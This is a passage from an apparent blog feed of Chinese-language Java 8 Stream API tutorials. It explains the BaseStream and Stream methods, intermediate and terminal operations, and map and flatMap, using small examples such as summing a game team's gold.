LongStream extends BaseStream&lt;Long, LongStream&gt; &#123;&#125;public interface DoubleStream extends BaseStream&lt;Double, DoubleStream&gt; &#123;&#125;&#x2F;&#x2F;这是最具代表性的接口public interface Stream&lt;T&gt; extends BaseStream&lt;T, Stream&lt;T&gt;&gt; &#123;&#x2F;&#x2F;....先忽略这些具体的细节&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于Stream接口是最具代表性的，所以我们就选择它来讲解，其实在我们学完Stream接口，其它的三个接口，在使用上基本是一致的了，我们上一篇的Demo基本上也是使用Stream接口来做的练习。我们回想一下:在上一个Demo中我们通过集合框架的stream()方法，就能返回一个流了，它的返回类型就是Stream<T>，比如我们Stream<Integer>，由此得知，Stream接口里的类型参数T就是流中的元素的类型。木有错，就是这样滴。到这里，整个系列你们已经全部学会了，下课。</p><p><img src="https://upload-images.jianshu.io/upload_images/1640787-cac539e2ac3e760f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>战斗才刚刚开始！</p><p><img src="https://upload-images.jianshu.io/upload_images/1640787-65d8e79c87d2ec76.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>现在是时候开始记忆一些知识了.</p><h4 id="BaseStream详解"><a href="#BaseStream详解" class="headerlink" title="BaseStream详解:"></a>BaseStream详解:</h4><pre class="line-numbers language-none"><code class="language-none">public interface BaseStream&lt;T, S extends BaseStream&lt;T, S&gt;&gt; extends AutoCloseable &#123;     Iterator&lt;T&gt; iterator();&#x2F;&#x2F;line2     Spliterator&lt;T&gt; spliterator();&#x2F;&#x2F;line3     boolean isParallel();&#x2F;&#x2F;line4     S sequential();&#x2F;&#x2F;line5     S parallel();&#x2F;&#x2F;line6     S unordered();&#x2F;&#x2F;line7     S onClose(Runnable closeHandler);&#x2F;&#x2F;line8     @Override     void close();&#x2F;&#x2F;line10&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>Iterator<T> iterator();</strong>  <em><code>//line2</code></em><br>获得流的迭代器，并返回对该迭代器的引用(终端操作)</li><li><strong>Spliterator<T> spliterator();</strong> <em><code>//line3</code></em><br>获取流的spliterator，并返回其引用(终端操作)</li><li><strong>boolean isParallel();</strong> <em><code>//line4</code></em><br>如果调用流是一个并行流，则返回true;如果调用流是一个顺序流，则返回false。</li><li><strong>S sequential();</strong> <em><code>//line5</code></em><br>基于调用流，返回一个顺序流。如果调用流已经是顺序流了，就返回该流。(中间操作)</li><li><strong>S parallel();</strong> <em><code>//line6</code></em><br>基于调用流，返回一个并行流。如果调用流已经是并行流了，就返回该流。(中间操作)</li><li><strong>S unordered();</strong> <em><code>//line7</code></em><br>基于调用流，返回一个无序流。如果调用流已经是无序流了，就返回该流。(中间操作)</li><li><strong>S onClose(Runnable closeHandler);</strong> <em><code>//line8</code></em><br>返回一个新流，closeHandler指定了该流的关闭处理程序，当关闭该流时，将调用这个处理程序。(中间操作)</li><li><strong>void close();</strong> <em><code>//line10</code></em><br>从AutoCloseable继承来的，调用注册关闭处理程序，关闭调用流(很少会被使用到)</li></ul><h4 id="“终端操作”-”中间操作”"><a href="#“终端操作”-”中间操作”" class="headerlink" title="“终端操作”&amp;”中间操作”"></a>“终端操作”&amp;”中间操作”</h4><p>细心的同学应该注意到了，BaseStream接口里面的很多方法都在最后标识了(终端操作)和(中间操作)，它们之间的区别是非常重要的。</p><ul><li><p><strong>终端操作</strong>   会消费流，这种操作会产生一个结果的，比如上面的 iterator()和 spliterator()，以及上一篇中提到的min()和max()，或者是执行某一种操作，比如上一篇的forEach()，如果一个流被消费过了，那它就不能被重用的。</p></li><li><p><strong>中间操作</strong>   中间操作会产生另一个流。因此中间操作可以用来创建执行一系列动作的管道。一个特别需要注意的点是:中间操作不是立即发生的。相反，当在中间操作创建的新流上执行完终端操作后，中间操作指定的操作才会发生。所以中间操作是延迟发生的，中间操作的延迟行为主要是让流API能够更加高效地执行。</p></li></ul><h4 id="“中间操作”的状态"><a href="#“中间操作”的状态" class="headerlink" title="“中间操作”的状态"></a>“中间操作”的状态</h4><p>流的中间操作，可以为分<code>无状态操作</code>和<code>有状态操作</code>两种，在无状态操作中，在处理流中的元素时，会对当前的元素进行单独处理。比如:谓词过滤操作，因为每个元素都是被单独进行处理的，所有它和流中的其它元素无关，因此被称为无状态操作;而在有状态操作中，某个元素的处理可能依赖于其他元素。比如查找最小值，最大值，和排序，因为他们都依赖于其他的元素。因此为称为有状态操作。<code>当需要进行并行处理流时，有状态的操作和无状态的区别是非常重要的，因为有状态操作可能需要几次处理才能完成，后面的文章我将会给大家详细地讲，现在只需要正常学习下去就可以了</code></p><p>另外，指出一点，如果大家了解泛型的话，应该知道，泛型的类型参数只能是引用类型，因此Stream操作的对象只能是引用类型的，不能用于基本类型。当然官方早已考虑到这一点了，前面你们看到的IntStream，LongStream，DoubleStream就是官方给我们提供的处理基本类型的流了。此处是不是应该给他们掌声！</p><h4 id="Stream详解"><a href="#Stream详解" class="headerlink" title="Stream详解"></a>Stream详解</h4><p>在有了前面的那些知识作铺垫之后，学Stream接口应该会顺风顺水了。还是先看看Stream的详情先:</p><pre class="line-numbers language-none"><code class="language-none">public interface Stream&lt;T&gt; extends BaseStream&lt;T, Stream&lt;T&gt;&gt; &#123;    Stream&lt;T&gt; filter(Predicate&lt;? super T&gt; predicate);&#x2F;&#x2F;line2    &lt;R&gt; Stream&lt;R&gt; map(Function&lt;? super T, ? extends R&gt; mapper);&#x2F;&#x2F;line3    IntStream mapToInt(ToIntFunction&lt;? super T&gt; mapper);&#x2F;&#x2F;line4    LongStream mapToLong(ToLongFunction&lt;? super T&gt; mapper);    DoubleStream mapToDouble(ToDoubleFunction&lt;? super T&gt; mapper);    &lt;R&gt; Stream&lt;R&gt; flatMap(Function&lt;? super T, ? extends Stream&lt;? extends R&gt;&gt; mapper);    IntStream flatMapToInt(Function&lt;? super T, ? extends IntStream&gt; mapper);    LongStream flatMapToLong(Function&lt;? super T, ? extends LongStream&gt; mapper);    DoubleStream flatMapToDouble(Function&lt;? super T, ? extends DoubleStream&gt; mapper);    Stream&lt;T&gt; distinct();    Stream&lt;T&gt; sorted();&#x2F;&#x2F;line12    Stream&lt;T&gt; sorted(Comparator&lt;? super T&gt; comparator);&#x2F;&#x2F;line13    Stream&lt;T&gt; peek(Consumer&lt;? super T&gt; action);    Stream&lt;T&gt; limit(long maxSize);    Stream&lt;T&gt; skip(long n);    void forEach(Consumer&lt;? super T&gt; action);&#x2F;&#x2F;line17    void forEachOrdered(Consumer&lt;? super T&gt; action);&#x2F;&#x2F;line18    Object[] toArray();    &lt;A&gt; A[] toArray(IntFunction&lt;A[]&gt; generator);    T reduce(T identity, BinaryOperator&lt;T&gt; accumulator);    Optional&lt;T&gt; reduce(BinaryOperator&lt;T&gt; accumulator);    &lt;U&gt; U reduce(U identity,                 BiFunction&lt;U, ? super T, U&gt; accumulator,                 BinaryOperator&lt;U&gt; combiner);    &lt;R&gt; R collect(Supplier&lt;R&gt; supplier,                  BiConsumer&lt;R, ? super T&gt; accumulator,                  BiConsumer&lt;R, R&gt; combiner);    &lt;R, A&gt; R collect(Collector&lt;? super T, A, R&gt; collector);    Optional&lt;T&gt; min(Comparator&lt;? super T&gt; comparator);&#x2F;&#x2F;line30    Optional&lt;T&gt; max(Comparator&lt;? super T&gt; comparator);&#x2F;&#x2F;line31    long count();    boolean anyMatch(Predicate&lt;? super T&gt; predicate);    boolean allMatch(Predicate&lt;? super T&gt; predicate);    boolean noneMatch(Predicate&lt;? super T&gt; predicate);    Optional&lt;T&gt; findFirst();    Optional&lt;T&gt; findAny();    &#x2F;&#x2F; Static factories    public static&lt;T&gt; Builder&lt;T&gt; builder() &#123;        return new Streams.StreamBuilderImpl&lt;&gt;();    &#125;    public static&lt;T&gt; Stream&lt;T&gt; empty() &#123;        return StreamSupport.stream(Spliterators.&lt;T&gt;emptySpliterator(), false);    &#125;    public static&lt;T&gt; Stream&lt;T&gt; of(T t) &#123;        return StreamSupport.stream(new Streams.StreamBuilderImpl&lt;&gt;(t), false);    &#125;    @SafeVarargs    @SuppressWarnings(&quot;varargs&quot;) &#x2F;&#x2F; Creating a stream from an array is safe    public static&lt;T&gt; Stream&lt;T&gt; of(T... values) &#123;        return Arrays.stream(values);    &#125;    public static&lt;T&gt; Stream&lt;T&gt; iterate(final T seed, final UnaryOperator&lt;T&gt; f) &#123;        Objects.requireNonNull(f);        final Iterator&lt;T&gt; iterator &#x3D; new Iterator&lt;T&gt;() &#123;            @SuppressWarnings(&quot;unchecked&quot;)            T t &#x3D; (T) Streams.NONE;            @Override            public boolean hasNext() &#123;                return true;            &#125;            @Override            public T next() &#123;                return t &#x3D; (t &#x3D;&#x3D; Streams.NONE) ? seed : f.apply(t);            &#125;        &#125;;        return StreamSupport.stream(Spliterators.spliteratorUnknownSize(                iterator,                Spliterator.ORDERED | Spliterator.IMMUTABLE), false);    &#125;    public static&lt;T&gt; Stream&lt;T&gt; generate(Supplier&lt;T&gt; s) &#123;        Objects.requireNonNull(s);        return StreamSupport.stream(                new StreamSpliterators.InfiniteSupplyingSpliterator.OfRef&lt;&gt;(Long.MAX_VALUE, s), false);    &#125;    public static &lt;T&gt; Stream&lt;T&gt; concat(Stream&lt;? extends T&gt; a, Stream&lt;? extends T&gt; b) &#123;        Objects.requireNonNull(a);        Objects.requireNonNull(b);        @SuppressWarnings(&quot;unchecked&quot;)        Spliterator&lt;T&gt; split &#x3D; new Streams.ConcatSpliterator.OfRef&lt;&gt;(                (Spliterator&lt;T&gt;) a.spliterator(), (Spliterator&lt;T&gt;) b.spliterator());        Stream&lt;T&gt; stream &#x3D; StreamSupport.stream(split, a.isParallel() || b.isParallel());        return stream.onClose(Streams.composedClose(a, b));    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>Stream<T> filter(Predicate&lt;? super T&gt; predicate);</strong>  <em><code>//line2</code></em><br>产生一个新流，其中包含调用流中满足predicate指定的谓词元素(中间操作)</li><li><strong><R> Stream<R> map(Function&lt;? super T, ? extends R&gt; mapper);</strong>  <em><code>//line3</code></em><br>产生一个新流，对调用流中的元素应用mapper，新流中包含这些元素。(中间操作)</li><li><strong>IntStream mapToInt(ToIntFunction&lt;? super T&gt; mapper);</strong> <em><code>//line4</code></em><br>对调用流中元素应用mapper，产生包含这些元素的一个新IntStream流。(中间操作)</li><li><strong>Stream<T> sorted();</strong> <em><code>//line12</code></em></li><li><strong>Stream<T> sorted(Comparator&lt;? super T&gt; comparator);</strong> <em><code>//line13</code></em>&#96;<br>产生一个自然顺序排序或者指定排序条件的新流(中间操作)</li><li><strong>void forEach(Consumer&lt;? super T&gt; action);</strong>  <em><code>//line17</code></em></li><li><strong>void forEachOrdered(Consumer&lt;? super T&gt; action);</strong> <em><code>//line18</code></em><br>遍历了流中的元素(终端操作)</li><li><strong>Optional<T> min(Comparator&lt;? super T&gt; comparator)</strong>  <em><code>//line30</code></em></li><li><strong>Optional<T> max(Comparator&lt;? super T&gt; comparator);</strong> <em><code>//line31</code></em><br>获得流中最大最小值，比较器可以由自己定义，也可以使用JDK提供的(终端操作)</li></ul><h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>这一篇主要是介绍了流API的一些关键方法，和一些关键的概念，虽然稍微枯燥了一点，但是，不能否认，全面地学习流API，会让你对流API的认识会更加的深刻，所以如果时间允许，请再认真读读这一篇文章吧，当然，也可以在实践中慢慢认识它们，但是，对于这些基本概念的知识，你越早掌握，对你的益处是更加大的。到此为止，流API的基础知识已经学完了，后面的几篇文章我们就要开始更加深入地理解和运用他们实现一起强有力的功能了！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 新特性之 Stream 流（五）映射</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%BA%94%EF%BC%89%E6%98%A0%E5%B0%84/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%BA%94%EF%BC%89%E6%98%A0%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<p>经过了前面四篇文章的学习，相信大家对Stream流已经是相当的熟悉了，同时也掌握了一些高级功能了，如果你之前有阅读过集合框架的基石<code>Collection</code>接口，是不是在经过前面的学习，以前看不懂的东西，突然之间就恍然大悟了呢？</p><p>今天我们的主角是Stream流里面的映射。由于之前，映射并没有再我们的Demo，例子中出现过，所以对大家来说可能会稍微有一点点陌生的，但通过这一篇文章，我相信能解决你的疑问。</p><p>在正式开始之前，我和大家继续说说流API操作，不知道大家有没有注意到，其实我们所有的流API操作都是针对流中的元素进行的，并且都是基于同一流里面的，大家有没有这样的疑问，怎么样把一个流的元素弄到另一个流里面呢？怎么把流中的一些满足条件的元素放到一个新流里面呢？</p><p>通过这一节，你将会掌握解决刚才问题的本领。另外再提一点，如果流操作只有中间操作，没有终端操作，那么这些中间操作是不会执行的，换句话说，只有终端操作才能触发中间操作的运行。</p><h4 id="我们为什么需要映射？"><a href="#我们为什么需要映射？" class="headerlink" title="我们为什么需要映射？"></a>我们为什么需要映射？</h4><p>因为在很多时候，将一个流的元素映射到另一个流对我们是非常有帮助的。比如有一个包含有名字，手机号码和钱的数据库构成的流，可能你只想要映射钱这个字段到另一个流，这时候可能之前学到的知识就还不能解决，于是映射就站了出来了。</p><p>另外，如果你希望对流中的元素应用一些转换，然后把转换的元素映射到一个新流里面，这时候也可以用映射。</p><p>我们先来看看流API库给我们提供了什么样的支持</p><pre class="line-numbers language-none"><code class="language-none">public interface Stream&lt;T&gt; extends BaseStream&lt;T, Stream&lt;T&gt;&gt; &#123;    &lt;R&gt; Stream&lt;R&gt; map(Function&lt;? super T, ? extends R&gt; mapper);&#x2F;&#x2F;line2    IntStream mapToInt(ToIntFunction&lt;? super T&gt; mapper);&#x2F;&#x2F;line3    LongStream mapToLong(ToLongFunction&lt;? super T&gt; mapper);&#x2F;&#x2F;line4    DoubleStream mapToDouble(ToDoubleFunction&lt;? super T&gt; mapper);&#x2F;&#x2F;line5    &lt;R&gt; Stream&lt;R&gt; flatMap(Function&lt;? super T, ? extends Stream&lt;? extends R&gt;&gt; mapper);&#x2F;&#x2F;line6    IntStream flatMapToInt(Function&lt;? super T, ? extends IntStream&gt; mapper);&#x2F;&#x2F;line7    LongStream flatMapToLong(Function&lt;? super T, ? extends LongStream&gt; mapper);&#x2F;&#x2F;line8    DoubleStream flatMapToDouble(Function&lt;? super T, ? extends DoubleStream&gt; mapper);&#x2F;&#x2F;line9&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我和大家分析一个最具有一般性的映射方法map()，相信大家就能举一反三了，map()定义如下，</p><p> <strong><R> Stream<R> map(Function&lt;? super T, ? extends R&gt; mapper);</strong></p><p>其中，R指定新流的元素类型，T指定调用流的元素类型，mapper是完成映射的Function实例，被称为映射函数，映射函数必须是无状态和不干预的（大家对这二个约束条件应该很熟悉了吧）。因为map()方法会返回一个新流，因此它是一个中间操作。</p><p><code>Function</code>是 <code>java.util.function</code>包中声明的一个函数式接口，声明如下：</p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface Function&lt;T, R&gt; &#123;     R apply(T t);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在map()的使有过程中，T是调用流的元素类型，R是映射的结果类型。其中,apply(T t)中的t是对被映射对象的引用，被返回映射结果。下面我们将上一篇中的例子进行变形，用映射来完成他:</p><p><code>假设List里面有三个Integer类型的元素分别为1，2，3。现在的需求是分别让List里面的每个元素都放大两倍后，再求积。这个需求的正确答案应该是48;</code></p><pre class="line-numbers language-none"><code class="language-none">private static void learnMap() &#123;     List&lt;Integer&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(1);        lists.add(2);        lists.add(3);     &#x2F;&#x2F;使用并行流来处理     Integer product &#x3D; lists.parallelStream().reduce(1, (a, b) -&gt; a *  (b * 2),                                                        (a, b) -&gt; a * b);     System.out.println(&quot;product:&quot; + product);&#x2F;&#x2F;48     &#x2F;&#x2F;使用映射来处理      &#x2F;&#x2F;Integer productMap &#x3D; lists.parallelStream().map((a) -&gt; a * 2).reduce(1, (a, b) -&gt; a * b);     Stream&lt;Integer&gt; productNewMapStream &#x3D; lists.parallelStream().map((a) -&gt; a * 2);     Integer productMap &#x3D; productNewMapStream.reduce(1, (a, b) -&gt; a * b);     System.out.println(&quot;productMap:&quot; + productMap);&#x2F;&#x2F;48&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与使用并行流不同，在使用映射处理的时候，元素扩大2倍发生时机不一样了，使用并行流元素扩大是在缩减的过程当中的，而使用映射处理时，元素扩大是发生在映射过程中的。因此映射过程完程之后，不需要reduce()提供合并器了。</p><p>上面的这个例子还是简单了一点，下面再举一个例子,王者荣耀团队经济计算：</p><pre class="line-numbers language-none"><code class="language-none">#玩家使用的英雄以及当前获得的金币数public class HeroPlayerGold &#123;    &#x2F;** 使用的英雄名字 *&#x2F;    private String hero;    &#x2F;** 玩家的ID *&#x2F;    private String player;    &#x2F;** 获得的金币数 *&#x2F;    private int gold;    public HeroPlayerGold(String hero, String player, int gold) &#123;        this.hero &#x3D; hero;        this.player &#x3D; player;        this.gold &#x3D; gold;    &#125;  &#x2F;&#x2F;省略get&#x2F;set&#x2F;toString&#125;#玩家获得的金币数public class Gold &#123;    &#x2F;** 获得的金币数 *&#x2F;    private int gold;    public Gold(int gold) &#123;        this.gold &#x3D; gold;    &#125; &#x2F;&#x2F;省略get&#x2F;set&#x2F;toString｝#测试类public class Main &#123;    public static void main(String[] args) &#123;        learnMap2th();    &#125;    private static void learnMap2th() &#123;        List&lt;HeroPlayerGold&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(new HeroPlayerGold(&quot;盖伦&quot;, &quot;RNG-Letme&quot;, 100));        lists.add(new HeroPlayerGold(&quot;诸葛亮&quot;, &quot;RNG-Xiaohu&quot;, 300));        lists.add(new HeroPlayerGold(&quot;露娜&quot;, &quot;RNG-MLXG&quot;, 300));        lists.add(new HeroPlayerGold(&quot;狄仁杰&quot;, &quot;RNG-UZI&quot;, 500));        lists.add(new HeroPlayerGold(&quot;牛头&quot;, &quot;RNG-Ming&quot;, 500));        &#x2F;&#x2F;计算团队经济        int teamMoney &#x3D; lists.stream()                .map(player -&gt; new Gold(player.getGold()))&#x2F;&#x2F;note1                .mapToInt(Gold::getGold)                .reduce(0, (a, b) -&gt; a + b);        System.out.println(&quot;团队经济：&quot; + teamMoney);&#x2F;&#x2F;1700        &#x2F;&#x2F;计算团队经济2        double teamMoney2 &#x3D; lists.stream()                .mapToDouble(HeroPlayerGold::getGold)                .reduce(0, (a, b) -&gt; a + b);        System.out.println(&quot;团队经济：&quot; + teamMoney2);&#x2F;&#x2F;1700.0    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码应该不难理解，通过代码，大家应该知道我们假设的场景了。我们的RNG去参加王者荣耀比赛了，像这种团队游戏，观众在经济方面关注更多的可能是团队经济，而不是个人经济。</p><p>在我们<code>HeroPlayerGold</code>类里面存有明星玩家，使用的英雄，和这局比赛某个玩家当前获得的金币数，我们另有一个专们管理金币的<code>Gold</code>类，我们第一种计算团队经济的方式，使把<code>HeroPlayerGold</code>里面的<code>gold</code>字段转换到<code>Gold</code>里面了<sup> <code>//note1</code> </sup>,这里产生的新流只包含了原始流中选定的<code>gold</code>字段，因为我们的原始流中包含了<code>hero</code>、<code>player</code>、<code>gold</code>,三个字段，我们只选取了<code>gold</code>字段（因为我们只关心这个字段），所以其它的两个字段被丢弃了。然后从新流取出<code>Gold</code>里面的<code>gold</code>字段并把他转成一个<code>IntStream</code>，然后我们就要以通过缩减操作完成我们的团队经济计算了。</p><p>第一种方式，大家需要好好理解，理解了，我相信你们的项目中，很多很多地方可以用得上了，再也不需要动不动就查数据库了，怎样效率高怎样来，只是一种建议。第二种只是快速计算团队经济而已，没什么值得讲的。</p><p>接下来讲一下他的扩展方向：大家还记得我在第二篇中介绍中间操作概念的时候吗？<code>中间操作会产生另一个流。因此中间操作可以用来创建执行一系列动作的管道。</code>我们可以把多个中间操作放到管道中，所以我们很容易就创建出很强大的组合操作了，发挥你的想象，打出你们的组合拳;</p><p>我现在举一个例子：比如现在相统计团队里面两个C位的经济占了多少，代码看起来可能就是这样了：</p><pre class="line-numbers language-none"><code class="language-none">private static void learnMap2th() &#123;       List&lt;HeroPlayerGold&gt; lists &#x3D; new ArrayList&lt;&gt;();       lists.add(new HeroPlayerGold(&quot;盖伦&quot;, &quot;RNG-Letme&quot;, 100));       lists.add(new HeroPlayerGold(&quot;诸葛亮&quot;, &quot;RNG-Xiaohu&quot;, 300));       lists.add(new HeroPlayerGold(&quot;露娜&quot;, &quot;RNG-MLXG&quot;, 300));       lists.add(new HeroPlayerGold(&quot;狄仁杰&quot;, &quot;RNG-UZI&quot;, 500));       lists.add(new HeroPlayerGold(&quot;牛头&quot;, &quot;RNG-Ming&quot;, 500));              &#x2F;&#x2F;计算两个C位的经济和       lists.stream()               .filter(player-&gt; &quot;RNG-Xiaohu&quot;.equals(player.getPlayer()) || &quot;RNG-UZI&quot;.equals(player.getPlayer()))               .map(player-&gt;new Gold(player.getGold()))               .mapToInt(Gold::getGold)               .reduce((a,b)-&gt;a+b)               .ifPresent(System.out::println);&#x2F;&#x2F;800   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大家有没有感觉，这种操作怎么带有点数据库的风格啊？其实在创建数据库查询的时候，这种过滤操作十分常见，如果你经常在你的项目中使用流API，这几个条件算什么?等你们把流API用熟了之后，你们完全可以通过这种链式操作创建出非常复杂的查询，合并和选择的操作。</p><p>通过前面的例子，我们已经把<code>map()</code>，<code>mapToInt()</code>，<code>mapToLong()</code>，<code>mapToDouble</code>都讲了。那么剩下的就是flatMap()方法了。本来想让大家自行去理解这个方法的，因为怕这篇文章写得太长了。但是后面想想，还是我来给大家分析一下吧。</p><p><strong><R> Stream<R> flatMap(Function&lt;? super T, ? extends Stream&lt;? extends R&gt;&gt; mapper);</strong></p><p>通过前面的学习我们知道<code>mapper</code>是一个映射函数，它和map()方法也一样也会返回一个新流，我们把返回的新流称为映射流。<strong>我们提供的映射函数会处理原始流中的每一个元素，而映射流中包含了所有经过我们映射函数处理后产生的新元素。</strong> 加粗部份需要重点理解。</p><p>我们来看一下源码对flatMap()的注释:</p><blockquote><p>The  flatMap() operation has the effect of applying a one-to-many  transformation to the elements of the stream, and then flattening the resulting elements into a new stream.</p></blockquote><p>大意就是：<strong>flatMap()操作能把原始流中的元素进行一对多的转换，并且将新生成的元素全都合并到它返回的流里面。</strong>根据我们所学的知识，他的这种一对多的转换功能肯定就是映射函数提供的，这一点没有疑问吧！然后源码的注释上面还提供了一个例子，通过注释加例子，我相信大家都能非常清楚地理解flatMap()了。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;* &lt;p&gt;If &#123;@code orders&#125; is a stream of purchase orders, and each purchase * order contains a collection of line items, then the following produces a * stream containing all the line items in all the orders: * &lt;pre&gt;&#123;@code *     orders.flatMap(order -&gt; order.getLineItems().stream())... * &#125;&lt;&#x2F;pre&gt; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如果orders是一批采购订单对应的流，并且每一个采购订单都包含一系列的采购项，那么<code>orders.flatMap(order -&gt; order.getLineItems().stream())...</code>生成的新流将包含这一批采购订单中所有采购项。</strong> </p><p>我们用伪代码来就更加清晰了<code>Stream&lt;Orders&lt;OrderItem&gt;&gt;</code>&#x3D;&#x3D;&#x3D;&#x3D;&gt;Stream<OrderItem>。大家能理解了吗？还没理解？再来一个例子：</p><pre class="line-numbers language-none"><code class="language-none">private static void learnFlatMap() &#123;       &#x2F;&#x2F;(广州  深圳  上海  北京)的全拼的一些组合,下面我们就把每一个城市都划分一下       List&lt;String&gt; citys &#x3D; Arrays.asList(&quot;GuangZhou ShangHai&quot;, &quot;GuangZhou ShenZhen&quot;,               &quot;ShangHai ShenZhen&quot;, &quot;BeiJing ShangHai&quot;, &quot;GuangZhou BeiJing&quot;, &quot;ShenZhen BeiJing&quot;);       &#x2F;&#x2F;这里打印的数组对应的地址       citys.stream().map(mCitys -&gt; Arrays.stream(mCitys.split(&quot; &quot;))).forEach(System.out::println);&#x2F;&#x2F;note1       System.out.println();       &#x2F;&#x2F;流里面的元素还是一个数组       citys.stream()               .map(mCities -&gt; Arrays.stream(mCities.split(&quot; &quot;)))&#x2F;&#x2F;流里面的每个元素还是数组               .forEach(cities -&gt;cities.forEach(city-&gt; System.out.print(city+&quot; &quot;)));&#x2F;&#x2F;note2       System.out.println();       System.out.println();       &#x2F;&#x2F;直接一个flatMap()就把数组合并到映射流里面了       citys.stream().flatMap(mCities-&gt;Arrays.stream(mCities.split(&quot; &quot;))).forEach(System.out::println);&#x2F;&#x2F;note3       System.out.println();       &#x2F;&#x2F;使用distinct()方法去重！       citys.stream().flatMap(mCities-&gt;Arrays.stream(mCities.split(&quot; &quot;))).distinct().forEach(System.out::println);&#x2F;&#x2F;note4   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<sup> <code>//note1</code> </sup>处是无法打印元素的，使用map()打印元素的方式在<sup> <code>//note2</code> </sup>，原因也在注释中交待了，但是使用了flatMap()方法后，直接就可以打印了<sup> <code>//note3</code> </sup>，到这里，应该就能理解<strong>如果orders是一批采购订单对应的流，并且每一个采购订单都包含一系列的采购项，那么<code>orders.flatMap(order -&gt; order.getLineItems().stream())...</code>生成的新流将包含这一批采购订单中所有采购项。</strong> 了吧。最后<sup> <code>//note4</code> </sup>是一个去重的方法，大家运行一遍吧。</p><h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>通过这一篇文章，相信大家对流API中的映射已经不再陌生了，其实最需要注意的一个点是,map()和flatMap()的区别，我也一步步地带着大家理解和应用了。其实在流API这一块中，大家单单掌握概念是没什么用的，一定要去实战了，一个项目里面，集合框架这种东西用得还是特别多的，用到集合框架的大部份情况，其实都可以考虑一下用Stream流去操作一下，不仅增加效率，还可以增加业务流程的清晰度。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 新特性之 Stream 流（六）收集</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E5%85%AD%EF%BC%89%E6%94%B6%E9%9B%86/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E5%85%AD%EF%BC%89%E6%94%B6%E9%9B%86/</url>
      
